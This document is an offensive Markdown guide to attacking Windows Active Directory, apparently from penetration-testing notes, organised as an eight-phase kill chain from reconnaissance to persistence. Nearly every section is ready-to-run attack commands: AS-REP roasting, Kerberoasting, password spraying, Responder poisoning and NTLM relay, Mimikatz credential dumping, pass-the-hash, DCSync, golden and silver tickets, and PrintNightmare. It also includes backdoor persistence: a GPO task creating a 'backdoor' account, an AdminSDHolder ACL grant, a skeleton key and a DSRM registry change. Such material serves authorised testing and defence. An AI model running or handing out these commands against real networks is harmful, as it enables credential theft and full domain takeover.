# Active Directory Attacks - Complete Guide

## Overview

Active Directory (AD) is the central authentication and authorization service for Windows environments. This guide covers comprehensive attack methodologies against AD infrastructure.

## Attack Objectives

- **Initial Access**: Gain foothold in AD environment
- **Enumeration**: Map entire AD structure
- **Credential Harvesting**: Extract passwords and hashes  
- **Privilege Escalation**: Escalate to Domain Admin
- **Lateral Movement**: Move across AD network
- **Persistence**: Maintain long-term access
- **Data Exfiltration**: Extract sensitive AD data

## **Attack Kill Chain**

```
1. Reconnaissance → 2. Initial Access → 3. Enumeration → 
4. Credential Harvesting → 5. Lateral Movement → 
6. Privilege Escalation → 7. Domain Dominance → 8. Persistence
```

---

## Phase 1: Reconnaissance (External/No Credentials)

### 1.1 Domain Discovery
```bash
# DNS enumeration
dig _ldap._tcp.dc._msdcs.CORP.LOCAL SRV
nslookup -type=SRV _ldap._tcp.CORP.LOCAL

# Find domain controllers
nmap -p 389,636,3268,3269 192.168.1.0/24 --open

# Using Kerbrute (no creds needed!)
kerbrute userenum -d corp.local --dc 192.168.1.10 /usr/share/seclists/Usernames/Names/names.txt
```

### 1.2 User Enumeration (No Credentials)
```bash
# Enumerate valid usernames
kerbrute userenum -d corp.local --dc 192.168.1.10 users.txt

# SMTP user enumeration
smtp-user-enum -M RCPT -U users.txt -D corp.local -t 192.168.1.10

# SMB null session (if allowed)
enum4linux -U 192.168.1.10
smbclient -L //192.168.1.10 -N
```

### 1.3 AS-REP Roasting (No Credentials Required!)
```bash
# Find users without Kerberos pre-auth
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 192.168.1.10 -no-pass -format hashcat

# Crack hashes
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# Often yields initial credentials!
```

---

## Phase 2: Initial Access

### 2.1 Password Spraying
```bash
# Using CrackMapExec
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success

# Using sprayhound
python3 sprayhound.py -U users.txt -p 'Summer2024' -d corp.local -dc 192.168.1.10

# Common passwords
Password123, Welcome1, Summer2024, Winter2024, Company123
```

### 2.2 LLMNR/NBT-NS Poisoning
```bash
# Using Responder
responder -I eth0 -wrf

# Captures NTLM hashes when users mistype hostnames
# Crack with hashcat
hashcat -m 5600 ntlmv2_hashes.txt rockyou.txt
```

### 2.3 SMB Relay
```bash
# Using ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support

# With LDAP dump
ntlmrelayx.py -t ldap://192.168.1.10 --dump

# With privilege escalation
ntlmrelayx.py -t ldap://192.168.1.10 --escalate-user lowpriv
```

---

## Phase 3: Enumeration (With Credentials)

### 3.1 BloodHound Data Collection
```bash
# Using SharpHound (Windows)
SharpHound.exe -c All -d corp.local

# Using BloodHound.py (Linux)
bloodhound-python -u user -p password -d corp.local -ns 192.168.1.10 -c all

# Import into BloodHound
neo4j start
bloodhound
# Upload JSON files
# Find attack paths to Domain Admin!
```

### 3.2 PowerView Enumeration (Windows)
```powershell
# Import PowerView
Import-Module PowerView.ps1

# Domain info
Get-Domain
Get-DomainController

# Users
Get-DomainUser | select samaccountname,description
Get-DomainUser -Identity admin

# Find admin users
Get-DomainUser -AdminCount | select samaccountname

# Computers
Get-DomainComputer | select dnshostname,operatingsystem

# Groups
Get-DomainGroup | select samaccountname
Get-DomainGroupMember "Domain Admins"

# Find shares
Invoke-ShareFinder

# Find sensitive files
Invoke-FileFinder

# Find local admin access
Find-LocalAdminAccess

# Find domain trusts
Get-DomainTrust
```

### 3.3 LDAP Enumeration (Linux)
```bash
# Full domain dump
ldapdomaindump -u 'CORP\user' -p password 192.168.1.10

# Using windapsearch
python3 windapsearch.py --dc-ip 192.168.1.10 -u user@corp.local -p password -U

# Privileged users
python3 windapsearch.py --dc-ip 192.168.1.10 -u user@corp.local -p password --privileged-users

# Find SPNs
python3 windapsearch.py --dc-ip 192.168.1.10 -u user@corp.local -p password --unconstrained-users
```

---

## Phase 4: Credential Harvesting

### 4.1 Kerberoasting
```bash
# Get service account hashes
GetUserSPNs.py corp.local/user:password -dc-ip 192.168.1.10 -request -outputfile tgs.txt

# Crack with hashcat
hashcat -m 13100 tgs.txt rockyou.txt

# Targeted kerberoasting
GetUserSPNs.py corp.local/user:password -dc-ip 192.168.1.10 -request-user sqlservice
```

### 4.2 Password in Description
```bash
# Many admins store passwords in user descriptions!
ldapsearch -x -h 192.168.1.10 -D "user@corp.local" -w password -b "DC=corp,DC=local" "(objectClass=user)" description | grep -i "pass\|pwd"

# PowerView
Get-DomainUser | select samaccountname,description | Where-Object {$_.description -like "*pass*"}
```

### 4.3 LAPS Passwords
```bash
# If LAPS deployed, passwords stored in AD
# Find computers with LAPS
ldapsearch -x -h 192.168.1.10 -D "user@corp.local" -w password -b "DC=corp,DC=local" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

# Using CrackMapExec
crackmapexec ldap 192.168.1.10 -u user -p password --laps

# PowerView
Get-DomainComputer | Get-DomainObject -Properties ms-MCS-AdmPwd
```

### 4.4 Group Policy Preferences (GPP) Passwords
```bash
# Find GPP passwords (stored encrypted in SYSVOL)
# Key is publicly known!

# Using CrackMapExec
crackmapexec smb 192.168.1.10 -u user -p password --gpp-passwords

# Manual search
smbclient //192.168.1.10/SYSVOL -U user%password
> cd Policies
> findstr /S /I cpassword *.xml

# Decrypt (key is public)
gpp-decrypt <encrypted_password>
```

---

## Phase 5: Lateral Movement

### 5.1 Pass-the-Hash
```bash
# Using CrackMapExec
crackmapexec smb 192.168.1.0/24 -u administrator -H NTLM_HASH

# Using Impacket psexec
psexec.py administrator@192.168.1.100 -hashes :NTLM_HASH

# Using Evil-WinRM
evil-winrm -i 192.168.1.100 -u administrator -H NTLM_HASH
```

### 5.2 Pass-the-Ticket
```bash
# Extract tickets with Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# Import ticket
Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'

# Access resources
dir \\dc\c$
```

### 5.3 Overpass-the-Hash
```bash
# Use NTLM hash to get Kerberos ticket
getTGT.py corp.local/administrator -hashes :NTLM_HASH
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass administrator@dc.corp.local
```

---

## Phase 6: Privilege Escalation

### 6.1 ACL Abuse
```bash
# Find ACLs with BloodHound
# Look for: GenericAll, GenericWrite, WriteDacl, WriteOwner

# Exploit GenericAll on user
# Force password reset
net user victim NewPassword123! /domain

# Exploit WriteDacl
# Grant DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity user -Rights DCSync
```

### 6.2 GPO Abuse
```bash
# If you have write access to GPO
# Add malicious startup/logon script

# Using SharpGPOAbuse
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c net user backdoor Password123! /add" --GPOName "Default Domain Policy"
```

### 6.3 Delegation Abuse
```bash
# Unconstrained delegation
# Compromise computer, wait for DA to connect
Rubeus.exe monitor /interval:5

# Constrained delegation
Rubeus.exe s4u /user:serviceaccount /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.corp.local /ptt

# Resource-Based Constrained Delegation (RBCD)
# See Port 88 - Kerberos guide for details
```

### 6.4 PrintNightmare (CVE-2021-1675)
```bash
# If print spooler running and vulnerable
use exploit/windows/dcerpc/cve_2021_1675_printnightmare
set RHOSTS 192.168.1.10
set SMBUser user
set SMBPass password
exploit
```

---

## Phase 7: Domain Dominance

### 7.1 DCSync Attack
```bash
# Requires Replicating Directory Changes rights
# Or Domain Admin

# Using Mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp.local /user:Administrator"'

# Using Impacket
secretsdump.py corp.local/admin:password@192.168.1.10 -just-dc-ntlm

# Extract krbtgt hash
secretsdump.py corp.local/admin:password@192.168.1.10 -just-dc-user krbtgt
```

### 7.2 Golden Ticket
```bash
# Create with krbtgt hash
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain corp.local Administrator

# Import and use
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass administrator@dc.corp.local

# Permanent domain access!
```

### 7.3 Silver Ticket
```bash
# Create for specific service
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain corp.local -spn cifs/target.corp.local Administrator

# Use ticket
export KRB5CCNAME=Administrator.ccache
smbclient.py -k -no-pass corp.local/administrator@target.corp.local
```

### 7.4 DCShadow
```bash
# Requires DA and ability to create rogue DC
# Registers temporary DC and replicates malicious changes

# Using Mimikatz
mimikatz # lsadump::dcshadow /object:target$ /attribute:userAccountControl /value:532480
```

---

## Phase 8: Persistence

### 8.1 Golden Ticket Persistence
```bash
# Create long-lived golden ticket (10 years)
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain corp.local -duration 3650 Administrator
```

### 8.2 AdminSDHolder Abuse
```bash
# Add user to AdminSDHolder
# User will be added to protected groups every 60 minutes

Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -PrincipalIdentity backdoor -Rights All
```

### 8.3 Skeleton Key
```bash
# Inject backdoor password for all users
Invoke-Mimikatz -Command '"misc::skeleton"'

# Now all users can auth with password "mimikatz"
net use \\dc\c$ /user:Administrator@corp.local mimikatz
```

### 8.4 DSRM Password
```bash
# Directory Services Restore Mode password
# Backdoor on DC

# Dump DSRM password
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'

# Enable remote login with DSRM
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2

# Login with DSRM
psexec.py DSRM_user:DSRM_password@192.168.1.10
```

---

## Essential Tools

### Enumeration
- BloodHound/SharpHound
- PowerView
- ldapdomaindump
- windapsearch

### Exploitation
- Impacket suite
- Rubeus
- Mimikatz
- CrackMapExec

### Password Attacks
- Kerbrute
- GetUserSPNs
- GetNPUsers
- Hashcat

---

## Further Reading

- See `Port_88_Kerberos/README.md` for Kerberos attacks
- See `Port_389_LDAP/README.md` for LDAP enumeration
- See `Port_445_SMB/README.md` for SMB relay attacks
- See `Port_5985_WinRM/README.md` for lateral movement

---

**Last Updated**: 2026-06-16
